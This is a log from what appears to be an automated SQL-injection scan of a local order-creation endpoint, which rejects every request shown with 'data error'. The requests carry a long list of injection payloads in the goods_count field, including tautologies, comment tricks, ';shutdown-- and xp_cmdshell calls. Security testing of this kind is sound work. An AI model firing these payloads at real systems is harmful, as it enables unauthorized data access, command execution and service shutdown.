[INFO]00:17:42:722-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "'\n", "goods_id": "1"}}
[INFO]00:17:42:722-caseScan.py:113 >> code: 400
[INFO]00:17:42:723-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:42:739-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "\"\n", "goods_id": "1"}}
[INFO]00:17:42:739-caseScan.py:113 >> code: 400
[INFO]00:17:42:740-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:42:752-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "#\n", "goods_id": "1"}}
[INFO]00:17:42:753-caseScan.py:113 >> code: 400
[INFO]00:17:42:754-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:42:766-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "-\n", "goods_id": "1"}}
[INFO]00:17:42:767-caseScan.py:113 >> code: 400
[INFO]00:17:42:767-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:42:779-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "--\n", "goods_id": "1"}}
[INFO]00:17:42:780-caseScan.py:113 >> code: 400
[INFO]00:17:42:780-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:42:792-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' --\n", "goods_id": "1"}}
[INFO]00:17:42:793-caseScan.py:113 >> code: 400
[INFO]00:17:42:793-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:42:805-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "--';\n", "goods_id": "1"}}
[INFO]00:17:42:806-caseScan.py:113 >> code: 400
[INFO]00:17:42:806-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:42:818-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' ;\n", "goods_id": "1"}}
[INFO]00:17:42:819-caseScan.py:113 >> code: 400
[INFO]00:17:42:819-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:42:831-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "= '\n", "goods_id": "1"}}
[INFO]00:17:42:831-caseScan.py:113 >> code: 400
[INFO]00:17:42:832-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:42:845-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "= ;\n", "goods_id": "1"}}
[INFO]00:17:42:846-caseScan.py:113 >> code: 400
[INFO]00:17:42:846-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:42:860-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "= --\n", "goods_id": "1"}}
[INFO]00:17:42:860-caseScan.py:113 >> code: 400
[INFO]00:17:42:861-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:42:873-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "\\x23\n", "goods_id": "1"}}
[INFO]00:17:42:874-caseScan.py:113 >> code: 400
[INFO]00:17:42:875-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:42:888-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "\\x27\n", "goods_id": "1"}}
[INFO]00:17:42:888-caseScan.py:113 >> code: 400
[INFO]00:17:42:889-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:42:901-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "\\x3D \\x3B'\n", "goods_id": "1"}}
[INFO]00:17:42:902-caseScan.py:113 >> code: 400
[INFO]00:17:42:902-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:42:914-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "\\x3D \\x27\n", "goods_id": "1"}}
[INFO]00:17:42:915-caseScan.py:113 >> code: 400
[INFO]00:17:42:916-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:42:929-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "\\x27\\x4F\\x52 SELECT *\n", "goods_id": "1"}}
[INFO]00:17:42:930-caseScan.py:113 >> code: 400
[INFO]00:17:42:930-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:42:945-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "\\x27\\x6F\\x72 SELECT *\n", "goods_id": "1"}}
[INFO]00:17:42:946-caseScan.py:113 >> code: 400
[INFO]00:17:42:946-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:42:959-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "'or select *\n", "goods_id": "1"}}
[INFO]00:17:42:960-caseScan.py:113 >> code: 400
[INFO]00:17:42:961-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:42:972-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "admin'--\n", "goods_id": "1"}}
[INFO]00:17:42:973-caseScan.py:113 >> code: 400
[INFO]00:17:42:973-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:42:985-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "';shutdown--\n", "goods_id": "1"}}
[INFO]00:17:42:985-caseScan.py:113 >> code: 400
[INFO]00:17:42:986-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:42:998-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "<>\"'%;)(&+\n", "goods_id": "1"}}
[INFO]00:17:42:998-caseScan.py:113 >> code: 400
[INFO]00:17:42:999-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:010-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or ''='\n", "goods_id": "1"}}
[INFO]00:17:43:011-caseScan.py:113 >> code: 400
[INFO]00:17:43:011-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:023-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or 'x'='x\n", "goods_id": "1"}}
[INFO]00:17:43:024-caseScan.py:113 >> code: 400
[INFO]00:17:43:024-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:036-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "\" or \"x\"=\"x\n", "goods_id": "1"}}
[INFO]00:17:43:036-caseScan.py:113 >> code: 400
[INFO]00:17:43:037-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:048-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "') or ('x'='x\n", "goods_id": "1"}}
[INFO]00:17:43:048-caseScan.py:113 >> code: 400
[INFO]00:17:43:049-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:059-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "0 or 1=1\n", "goods_id": "1"}}
[INFO]00:17:43:060-caseScan.py:113 >> code: 400
[INFO]00:17:43:060-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:072-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or 0=0 --\n", "goods_id": "1"}}
[INFO]00:17:43:072-caseScan.py:113 >> code: 400
[INFO]00:17:43:073-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:085-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "\" or 0=0 --\n", "goods_id": "1"}}
[INFO]00:17:43:086-caseScan.py:113 >> code: 400
[INFO]00:17:43:087-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:099-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "or 0=0 --\n", "goods_id": "1"}}
[INFO]00:17:43:100-caseScan.py:113 >> code: 400
[INFO]00:17:43:101-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:112-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or 0=0 #\n", "goods_id": "1"}}
[INFO]00:17:43:113-caseScan.py:113 >> code: 400
[INFO]00:17:43:113-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:125-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "\" or 0=0 #\n", "goods_id": "1"}}
[INFO]00:17:43:126-caseScan.py:113 >> code: 400
[INFO]00:17:43:126-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:140-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "or 0=0 #\n", "goods_id": "1"}}
[INFO]00:17:43:140-caseScan.py:113 >> code: 400
[INFO]00:17:43:141-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:153-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or 1=1--\n", "goods_id": "1"}}
[INFO]00:17:43:153-caseScan.py:113 >> code: 400
[INFO]00:17:43:154-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:166-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "\" or 1=1--\n", "goods_id": "1"}}
[INFO]00:17:43:167-caseScan.py:113 >> code: 400
[INFO]00:17:43:167-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:179-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or '1'='1'--\n", "goods_id": "1"}}
[INFO]00:17:43:180-caseScan.py:113 >> code: 400
[INFO]00:17:43:180-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:193-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "\"' or 1 --'\"\n", "goods_id": "1"}}
[INFO]00:17:43:194-caseScan.py:113 >> code: 400
[INFO]00:17:43:194-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:206-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "or 1=1--\n", "goods_id": "1"}}
[INFO]00:17:43:206-caseScan.py:113 >> code: 400
[INFO]00:17:43:207-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:218-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "or%201=1\n", "goods_id": "1"}}
[INFO]00:17:43:219-caseScan.py:113 >> code: 400
[INFO]00:17:43:219-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:231-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "or%201=1 --\n", "goods_id": "1"}}
[INFO]00:17:43:232-caseScan.py:113 >> code: 400
[INFO]00:17:43:232-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:244-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or 1=1 or ''='\n", "goods_id": "1"}}
[INFO]00:17:43:245-caseScan.py:113 >> code: 400
[INFO]00:17:43:245-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:257-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "\" or 1=1 or \"\"=\"\n", "goods_id": "1"}}
[INFO]00:17:43:258-caseScan.py:113 >> code: 400
[INFO]00:17:43:258-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:270-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or a=a--\n", "goods_id": "1"}}
[INFO]00:17:43:271-caseScan.py:113 >> code: 400
[INFO]00:17:43:271-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:283-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "\" or \"a\"=\"a\n", "goods_id": "1"}}
[INFO]00:17:43:283-caseScan.py:113 >> code: 400
[INFO]00:17:43:284-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:296-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "') or ('a'='a\n", "goods_id": "1"}}
[INFO]00:17:43:297-caseScan.py:113 >> code: 400
[INFO]00:17:43:297-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:310-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "\") or (\"a\"=\"a\n", "goods_id": "1"}}
[INFO]00:17:43:311-caseScan.py:113 >> code: 400
[INFO]00:17:43:311-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:325-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "hi\" or \"a\"=\"a\n", "goods_id": "1"}}
[INFO]00:17:43:325-caseScan.py:113 >> code: 400
[INFO]00:17:43:326-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:339-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "hi\" or 1=1 --\n", "goods_id": "1"}}
[INFO]00:17:43:340-caseScan.py:113 >> code: 400
[INFO]00:17:43:341-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:354-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "hi' or 1=1 --\n", "goods_id": "1"}}
[INFO]00:17:43:355-caseScan.py:113 >> code: 400
[INFO]00:17:43:356-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:368-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "hi' or 'a'='a\n", "goods_id": "1"}}
[INFO]00:17:43:368-caseScan.py:113 >> code: 400
[INFO]00:17:43:369-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:381-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "hi') or ('a'='a\n", "goods_id": "1"}}
[INFO]00:17:43:381-caseScan.py:113 >> code: 400
[INFO]00:17:43:382-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:393-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "hi\") or (\"a\"=\"a\n", "goods_id": "1"}}
[INFO]00:17:43:394-caseScan.py:113 >> code: 400
[INFO]00:17:43:394-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:406-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "'hi' or 'x'='x';\n", "goods_id": "1"}}
[INFO]00:17:43:407-caseScan.py:113 >> code: 400
[INFO]00:17:43:407-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:419-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "@variable\n", "goods_id": "1"}}
[INFO]00:17:43:420-caseScan.py:113 >> code: 400
[INFO]00:17:43:420-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:432-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": ",@variable\n", "goods_id": "1"}}
[INFO]00:17:43:432-caseScan.py:113 >> code: 400
[INFO]00:17:43:433-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:444-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "PRINT\n", "goods_id": "1"}}
[INFO]00:17:43:445-caseScan.py:113 >> code: 400
[INFO]00:17:43:445-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:457-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "PRINT @@variable\n", "goods_id": "1"}}
[INFO]00:17:43:458-caseScan.py:113 >> code: 400
[INFO]00:17:43:458-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:471-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "select\n", "goods_id": "1"}}
[INFO]00:17:43:472-caseScan.py:113 >> code: 400
[INFO]00:17:43:472-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:484-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "insert\n", "goods_id": "1"}}
[INFO]00:17:43:484-caseScan.py:113 >> code: 400
[INFO]00:17:43:485-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:497-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "as\n", "goods_id": "1"}}
[INFO]00:17:43:498-caseScan.py:113 >> code: 400
[INFO]00:17:43:498-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:511-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "or\n", "goods_id": "1"}}
[INFO]00:17:43:512-caseScan.py:113 >> code: 400
[INFO]00:17:43:512-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:528-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "procedure\n", "goods_id": "1"}}
[INFO]00:17:43:528-caseScan.py:113 >> code: 400
[INFO]00:17:43:529-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:544-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "limit\n", "goods_id": "1"}}
[INFO]00:17:43:544-caseScan.py:113 >> code: 400
[INFO]00:17:43:545-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:558-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "order by\n", "goods_id": "1"}}
[INFO]00:17:43:558-caseScan.py:113 >> code: 400
[INFO]00:17:43:559-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:571-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "asc\n", "goods_id": "1"}}
[INFO]00:17:43:572-caseScan.py:113 >> code: 400
[INFO]00:17:43:572-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:584-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "desc\n", "goods_id": "1"}}
[INFO]00:17:43:586-caseScan.py:113 >> code: 400
[INFO]00:17:43:587-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:599-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "delete\n", "goods_id": "1"}}
[INFO]00:17:43:600-caseScan.py:113 >> code: 400
[INFO]00:17:43:601-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:613-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "update\n", "goods_id": "1"}}
[INFO]00:17:43:614-caseScan.py:113 >> code: 400
[INFO]00:17:43:614-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:627-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "distinct\n", "goods_id": "1"}}
[INFO]00:17:43:627-caseScan.py:113 >> code: 400
[INFO]00:17:43:628-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:640-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "having\n", "goods_id": "1"}}
[INFO]00:17:43:640-caseScan.py:113 >> code: 400
[INFO]00:17:43:641-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:654-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "truncate\n", "goods_id": "1"}}
[INFO]00:17:43:654-caseScan.py:113 >> code: 400
[INFO]00:17:43:655-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:667-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "replace\n", "goods_id": "1"}}
[INFO]00:17:43:668-caseScan.py:113 >> code: 400
[INFO]00:17:43:668-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:681-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "like\n", "goods_id": "1"}}
[INFO]00:17:43:681-caseScan.py:113 >> code: 400
[INFO]00:17:43:682-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:695-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "handler\n", "goods_id": "1"}}
[INFO]00:17:43:696-caseScan.py:113 >> code: 400
[INFO]00:17:43:696-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:710-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "bfilename\n", "goods_id": "1"}}
[INFO]00:17:43:711-caseScan.py:113 >> code: 400
[INFO]00:17:43:711-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:727-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or username like '%\n", "goods_id": "1"}}
[INFO]00:17:43:728-caseScan.py:113 >> code: 400
[INFO]00:17:43:729-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:743-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or uname like '%\n", "goods_id": "1"}}
[INFO]00:17:43:744-caseScan.py:113 >> code: 400
[INFO]00:17:43:745-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:757-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or userid like '%\n", "goods_id": "1"}}
[INFO]00:17:43:758-caseScan.py:113 >> code: 400
[INFO]00:17:43:759-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:772-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or uid like '%\n", "goods_id": "1"}}
[INFO]00:17:43:773-caseScan.py:113 >> code: 400
[INFO]00:17:43:774-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:786-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "' or user like '%\n", "goods_id": "1"}}
[INFO]00:17:43:786-caseScan.py:113 >> code: 400
[INFO]00:17:43:787-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:799-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "exec xp\n", "goods_id": "1"}}
[INFO]00:17:43:800-caseScan.py:113 >> code: 400
[INFO]00:17:43:800-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:812-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "exec sp\n", "goods_id": "1"}}
[INFO]00:17:43:813-caseScan.py:113 >> code: 400
[INFO]00:17:43:813-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:824-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "'; exec master..xp_cmdshell\n", "goods_id": "1"}}
[INFO]00:17:43:824-caseScan.py:113 >> code: 400
[INFO]00:17:43:825-caseScan.py:114 >> response: {
  "message": "data error"
}

[INFO]00:17:43:837-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": "'; exec xp_regread\n", "goods_id": "1"}}
